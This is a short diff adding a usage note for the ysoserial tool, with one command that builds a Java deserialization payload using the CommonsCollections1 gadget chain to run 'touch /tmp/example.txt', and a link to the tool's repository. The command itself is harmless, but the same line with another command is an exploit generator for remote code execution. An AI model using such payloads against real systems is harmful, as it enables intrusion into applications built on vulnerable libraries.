@@ -1,0 +1,6 @@
+Use the command below to create commands:
+```
+java -jar ysoserial.jar CommonsCollections1 'touch /tmp/example.txt' > /where/to/save
+```
+
+https://github.com/frohoff/ysoserial
